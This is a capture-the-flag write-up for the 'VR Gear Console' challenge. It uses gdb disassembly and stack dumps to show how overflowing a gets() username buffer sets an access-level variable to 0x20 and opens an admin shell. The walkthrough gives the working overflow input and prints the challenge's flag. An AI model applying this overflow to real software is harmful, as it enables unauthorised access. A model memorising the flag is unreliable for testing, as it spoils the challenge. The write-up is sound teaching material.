**Challenge name:** VR Gear Console      
**Description:** Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/51645e84d55d376442beaf264e0908b9    
**Hint:**     
- What happens if you read in more characters than the length of the username buffer?  
- You should look at an ascii table to see what character you need to choose.  
- Numbers are stored in little-endian format, which means that the lowest byte of the number is first.  
- "cat file - | vrgearconsole " will keep the pipe open for commands.  

**File(s) provided:**      
- vrgearconsole (32-bit setgid ELF)    
- vrgearconsole.c (source code)     
---
# Step 0: Recon

First off, it should be noted that the source code or this challenge does not entirely match the binary. When you intentially fail the login, you get the "Login unsuccessful." message. But looking at the code it never says this (it contains "Login successful" though)...
``` bash
# ./vrgearconsole
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): a
Password (max 31 characters): a
Your access level is: 0x000000ff
Login unsuccessful.
# grep "suc" vrgearconsole.c 
        printf("Login successful.\n");
```
Anyway, just keep this in mind when you solve it.

The program does the following:  
- read in username (using ```gets```)  
- read in password (using ```gets```) 
- determine accessLevel  
- spawn a shell if accessLevel is correct  

If we can overflow the buffers for username and/or password, we should be able to set accessLevel to whatever we want.

# Step 1: Look at the internals
We could figure out the internals by just fuzzing this, but let's take the methodical approach instead.
```gdb
# gdb vrgearconsole -q
Reading symbols from vrgearconsole...(no debugging symbols found)...done.
(gdb) disas login
Dump of assembler code for function login:
<snip>
   0x0804855b <+32>:	lea    eax,[ebp-0x1c]
   0x0804855e <+35>:	push   eax
   0x0804855f <+36>:	call   0x80483e0 <gets@plt>
   0x08048564 <+41>:	add    esp,0x10
   0x08048567 <+44>:	sub    esp,0xc
   0x0804856a <+47>:	push   0x80487d0
   0x0804856f <+52>:	call   0x80483d0 <printf@plt>
   0x08048574 <+57>:	add    esp,0x10
   0x08048577 <+60>:	sub    esp,0xc
   0x0804857a <+63>:	lea    eax,[ebp-0x3c]
   0x0804857d <+66>:	push   eax
   0x0804857e <+67>:	call   0x80483e0 <gets@plt>
   0x08048583 <+72>:	add    esp,0x10
  <snip>
   0x0804862f <+244>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048632 <+247>:	leave  
   0x08048633 <+248>:	ret    
End of assembler dump.
```
We can see that the username is stored at ```[ebp-0x1c]```, the password at ```[ebp-0x3c]```, and accessLevel at ```[ebp-0xc]```. Luckily for us, accessLevel is stored in a higher memory location than the other 2 variables, so we can indeed overwrite it. If this wasn't the case, we could still overwrite the return address and turn this in a classic buffer overflow exercise. Overwriting acessLevel is easier though, so we'll do that.

Let's have a look at the memory just after the second ```gets``` (username = "aaaa", password = "bbbb"):
```gdb
(gdb) break *0x08048583
Breakpoint 1 at 0x8048583
(gdb) run
Starting program: /mnt/hgfs/Shared/ctf/pico2017/vrgearconsole/vrgearconsole 
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): aaaa
Password (max 31 characters): bbbb

Breakpoint 1, 0x08048583 in login ()
(gdb) x/32xw $esp
0xffffd280:	0xffffd29c	0xf7fac000	0xffffd2c8	0xf7e58a1b
0xffffd290:	0xf7facd60	0x0000000a	0x000002a6	0x62626262
0xffffd2a0:	0xf7fe7800	0x00000000	0x000007d4	0xfbad2887
0xffffd2b0:	0xffffd2f8	0xf7fedf50	0xf7e5887b	0x61616161
0xffffd2c0:	0x00000000	0xf7fac000	0xffffd2f8	0x000000ff
0xffffd2d0:	0x08048860	0x00000000	0xffffd2f8	0x0804866d
0xffffd2e0:	0x00000001	0xffffd3a4	0xffffd3ac	0xf7e27a2b
0xffffd2f0:	0xf7fac3dc	0xffffd310	0x00000000	0xf7e11276
(gdb) i r ebp
ebp            0xffffd2d8	0xffffd2d8
```
We can see ```0x62626262```, ```0x61616161```, and ```0x000000ff``` at the expected memory locations (all in right most column).

# Step 2: Finding the right value to overwrite accessLevel with
Since we can't rely on the source code or this part, we need to reverse engineer the binary itself to figure out the logic. I've annotated the code blocks for the last part of ```main```:
```gdb
login():
   0x08048668 <+52>:	   call   0x804853b <login>
   0x0804866d <+57>:	   mov    DWORD PTR [ebp-0xc],eax

print accessLevel:
   0x08048670 <+60>:	   sub    esp,0x8
   0x08048673 <+63>:	   push   DWORD PTR [ebp-0xc]
   0x08048676 <+66>:	   push   0x8048b07
   0x0804867b <+71>:	   call   0x80483d0 <printf@plt>

if accessLevel > 0xfe, jmp +94:
   0x08048680 <+76>:	   add    esp,0x10
   0x08048683 <+79>:	   cmp    DWORD PTR [ebp-0xc],0xfe
   0x0804868a <+86>:	   jg     0x8048692 <main+94>

if accessLevel > 0, jmp +120:
   0x0804868c <+88>:	   cmp    DWORD PTR [ebp-0xc],0x0
   0x08048690 <+92>:	   jg     0x80486ac <main+120>

+94: "Login unsuccessful" + exit:
   0x08048692 <+94>:	   sub    esp,0xc
   0x08048695 <+97>:	   push   0x8048b25
   0x0804869a <+102>:	call   0x80483f0 <puts@plt>
   0x0804869f <+107>:	add    esp,0x10
   0x080486a2 <+110>:	sub    esp,0xc
   0x080486a5 <+113>:	push   0xa
   0x080486a7 <+115>:	call   0x8048420 <exit@plt>

+120: if accessLevel > 0x2f, jmp +176:
   0x080486ac <+120>:	cmp    DWORD PTR [ebp-0xc],0x2f
   0x080486b0 <+124>:	jg     0x80486e4 <main+176>

print "Admin access granted" + spawn shell:
   0x080486b2 <+126>:	sub    esp,0xc
   0x080486b5 <+129>:	push   0x8048b39
   0x080486ba <+134>:	call   0x80483f0 <puts@plt>
   0x080486bf <+139>:	add    esp,0x10
   0x080486c2 <+142>:	sub    esp,0xc
   0x080486c5 <+145>:	push   0x8048b4f
   0x080486ca <+150>:	call   0x80483f0 <puts@plt>
   0x080486cf <+155>:	add    esp,0x10
   0x080486d2 <+158>:	sub    esp,0xc
   0x080486d5 <+161>:	push   0x8048b6a
   0x080486da <+166>:	call   0x8048400 <system@plt>
   0x080486df <+171>:	add    esp,0x10
   0x080486e2 <+174>:	jmp    0x804870e <main+218>

+176: "don't have permission" + exit
   0x080486e4 <+176>:	sub    esp,0xc
   0x080486e7 <+179>:	push   0x8048b72
   0x080486ec <+184>:	call   0x80483f0 <puts@plt>
   0x080486f1 <+189>:	add    esp,0x10
   0x080486f4 <+192>:	sub    esp,0xc
   0x080486f7 <+195>:	push   0x8048b84
   0x080486fc <+200>:	call   0x80483f0 <puts@plt>
   0x08048701 <+205>:	add    esp,0x10
   0x08048704 <+208>:	sub    esp,0xc
   0x08048707 <+211>:	push   0x1
   0x08048709 <+213>:	call   0x8048420 <exit@plt>

+218: function epilogue
   0x0804870e <+218>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048711 <+221>:	leave  
   0x08048712 <+222>:	lea    esp,[ecx-0x4]
   0x08048715 <+225>:	ret    
```
In order to hit the right part of the code, accessLevel should be between ```0x0``` and ```0x2f``` (bounds not included); the space character (```0x20```) falls in this range. If we use make the username just long enough to put a single space in the accessLevel memory location (16 garbage bytes followed by a single space), we should get Admin access.

# Step 3: Get flag
``` bash
de_lille_d@shell-web:/problems/51645e84d55d376442beaf264e0908b9$ ./vrgearconsole                   
+----------------------------------------+                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
|  Welcome to the VR gear admin console  |                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
+----------------------------------------+                                                         
|                                        |                                                         
|      Your account is not recognized    |                                                         
|                                        |                                                         
+----------------------------------------+                                                         
                                                                                                   
                                                                                                   
                                                                                                   
                                                                                                   
Please login to continue...                                                                        
                                                                                                   
                                                                                                   
Username (max 15 characters): aaaabbbbccccdddd                                                     
Password (max 31 characters): a                                                                    
Your access level is: 0x00000020                                                                   
Admin access granted!                                                                              
The flag is in "flag.txt".                                                                         
$ cat flag.txt                                                                                     
8b7ea70220f19ab662750a8710a552c4                                                                   
```
Note: username was ```"aaaabbbbccccdddd "``` (with a space at the end)
